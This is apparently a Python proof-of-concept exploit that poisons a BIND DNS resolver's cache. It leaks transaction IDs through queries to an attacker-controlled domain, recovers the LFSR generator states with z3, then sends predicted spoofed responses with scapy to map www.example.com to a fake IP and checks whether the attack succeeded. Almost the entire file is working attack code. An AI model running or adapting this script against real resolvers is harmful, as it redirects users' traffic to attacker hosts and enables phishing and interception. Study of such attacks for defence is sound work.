import os
import sys
import time
import socket
import struct
import threading
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if PARENT_DIR not in sys.path:
    sys.path.insert(0, PARENT_DIR)

import z3
from common_library import *
from scapy.all import *


thread = threading.Thread(target=run_auth_server, daemon=True)
thread.start()

time.sleep(0.5)
print("[*] 1) Triggering chain via BIND at {}...".format(target_dns))
trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, "0.leak.attacker.com.", "A")
sr1(trigger, timeout=30, verbose=0)
print("[*] 2) Leaked the following TXIDs: {}".format(TXIDS))
thread.join(timeout=1)

print("[*] 3) Analyzing leaked TXIDs to find initial states...")
state_1, state_2 = find_initial_states(TXIDS)



print("[*] 4) First query, just to get the resolver to cache the NS record for example.com...")
dns_loader = build_spoofed_dns_request(attacker_ip, 12345, 53, "example.com.", "NS")
ans = sr1(dns_loader, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")


print("[*] 5) Sniffing for leaked TXID and target port...")
leaked_txid, target_port = sniff_port_and_txid(5)
print("[*] 6) Advancing LFSR states to align with leaked TXID...")
while True:
    state_1, state_2, tz = step_cross(state_1, state_2)
    #print("[+] skip: TXID {}".format(tz))
    if tz == leaked_txid:
        break


trigger_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
#prebuild query to speed up the attack, since we need to send 20 responses as fast as possible
to_send =[]
for i in range(20):
    state_1, state_2, tz = step_cross(state_1, state_2)
    pkt = build_spoofed_dns_response(tz, target_port, fake_ip, qname="www.example.com.", qtype='A')
    to_send.append(pkt)

print("[*] 7) Sending and spoofing responses.")
send(trigger_query, verbose=0)
send(to_send, verbose=0)


print("[*] 8) Verifying if the cache is poisoned...")
test_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
ans = sr1(test_query, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")